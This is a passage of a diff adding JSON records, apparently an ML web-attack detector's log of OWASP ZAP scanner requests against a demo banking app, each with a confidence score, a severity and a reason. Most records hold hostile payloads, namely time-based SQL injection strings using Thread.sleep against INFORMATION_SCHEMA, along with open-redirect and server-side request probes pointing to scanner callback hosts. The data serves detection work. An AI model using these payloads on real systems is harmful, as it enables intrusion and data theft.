+  "Confidence_Score": 0.9999600648880005,
+  "Severity": 3,
+  "Reason": "Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896f9"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP&btnSubmit=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27",
+  "Confidence_Score": 0.9999546706676483,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896fa"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=http%3A%2F%2F%5C6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9978987574577332,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896fb"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP&btnSubmit=http%3A%2F%2F%5C6542095270498749340.owasp.org",
+  "Confidence_Score": 0.9953599870204926,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896fc"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=https%3A%2F%2F%5C6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9979506433010101,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896fd"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP&btnSubmit=https%3A%2F%2F%5C6542095270498749340.owasp.org",
+  "Confidence_Score": 0.9951989054679871,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896fe"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=%2F%2F6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9975588619709015,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c896ff"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP&btnSubmit=%2F%2F6542095270498749340.owasp.org",
+  "Confidence_Score": 0.9962199330329895,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89700"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=6542095270498749340.owasp.org&comments=&submit=+Submit+",
+  "Confidence_Score": 0.7637909054756165,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89701"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=http%3A%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+",
+  "Confidence_Score": 0.7691482901573181,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89702"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+",
+  "Confidence_Score": 0.7704629302024841,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89703"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&comments=&submit=+Submit+",
+  "Confidence_Score": 0.7773905396461487,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89704"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9999680817127228,
+  "Severity": 3,
+  "Reason": "Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89705"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9981473684310913,
+  "Severity": 3,
+  "Reason": "Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89706"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=http%3A%2F%2F%5C6542095270498749340.owasp.org&comments=&submit=+Submit+",
+  "Confidence_Score": 0.7704629302024841,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89707"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=6542095270498749340.owasp.org",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9486488401889801,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89708"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F%5C6542095270498749340.owasp.org&comments=&submit=+Submit+",
+  "Confidence_Score": 0.7720413208007812,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89709"
+  },
+  "path": "/search.jsp?query=6542095270498749340.owasp.org",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.6057338267564774,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8970a"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9684530198574066,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8970b"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+",
+  "Confidence_Score": 0.7651411890983582,
+  "Severity": 2,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8970c"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9705420136451721,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8970d"
+  },
+  "path": "/search.jsp?query=http%3A%2F%2F6542095270498749340.owasp.org",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.6446899026632309,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8970e"
+  },
+  "path": "/survey_questions.jsp?step=6542095270498749340.owasp.org",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.6521035134792328,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8970f"
+  },
+  "path": "/static/index.jsp?content=6542095270498749340.owasp.org",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.6483664512634277,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89710"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=6542095270498749340.owasp.org&submit=+Submit+",
+  "Confidence_Score": 0.997619092464447,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89711"
+  },
+  "path": "/search.jsp?query=https%3A%2F%2F6542095270498749340.owasp.org",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.6483664512634277,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89712"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=https%3A%2F%2F6542095270498749340%252eowasp%252eorg",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9775631427764893,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89713"
+  },
+  "path": "/survey_questions.jsp?step=http%3A%2F%2F6542095270498749340.owasp.org",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.6748962985829734,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89714"
+  },
+  "path": "/search.jsp?query=https%3A%2F%2F6542095270498749340%252eowasp%252eorg",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.6636052578687668,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89715"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999995529651642,
+  "Severity": 3,
+  "Reason": "Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89716"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=http%3A%2F%2F6542095270498749340.owasp.org&submit=+Submit+",
+  "Confidence_Score": 0.9980012476444244,
+  "Severity": 3,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89717"
+  },
+  "path": "/static/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.6748962985829734,
+  "Severity": 1,
+  "Reason": "The combination of its features matches patterns of known threats learned by the model."
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89718"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&template=US",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89719"
+  },
+  "path": "/images/index.jsp?content=personal.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8971a"
+  },
+  "path": "/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8971b"
+  },
+  "path": "/index.jsp?content=inside_volunteering.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8971c"
+  },
+  "path": "/Documents/JohnSmith/index.jsp?content=personal.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8971d"
+  },
+  "path": "/survey_questions.jsp?step=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8971e"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=ZAP&btnSubmit=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8971f"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89720"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89721"
+  },
+  "path": "/search.jsp?query=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89722"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999998807907104,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89723"
+  },
+  "path": "/static/index.jsp?content=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89724"
+  },
+  "path": "/images/index.jsp?content=personal.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89725"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89726"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&job=MortgageLendingAccountExecutive%3ASales",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89727"
+  },
+  "path": "/disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89728"
+  },
+  "path": "/survey_questions.jsp?step=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89729"
+  },
+  "path": "/index.jsp?content=inside_volunteering.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8972a"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8972b"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=ZAP&btnSubmit=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8972c"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8972d"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&btnSubmit=Login",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8972e"
+  },
+  "path": "/static/index.jsp?content=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8972f"
+  },
+  "path": "/search.jsp?query=%22java.lang.Thread.sleep%22%2815000%29",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999998509883881,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89730"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89731"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&job=MortgageLendingAccountExecutive%3ASales",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89732"
+  },
+  "path": "/images/index.jsp?content=personal.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89733"
+  },
+  "path": "/survey_questions.jsp?step=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89734"
+  },
+  "path": "/index.jsp?content=inside_volunteering.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89735"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=ZAP&btnSubmit=%22java.lang.Thread.sleep%22%2815000%29",
+  "Confidence_Score": 0.9999986290931702,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89736"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=%22java.lang.Thread.sleep%22%2815000%29&btnSubmit=Login",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89737"
+  },
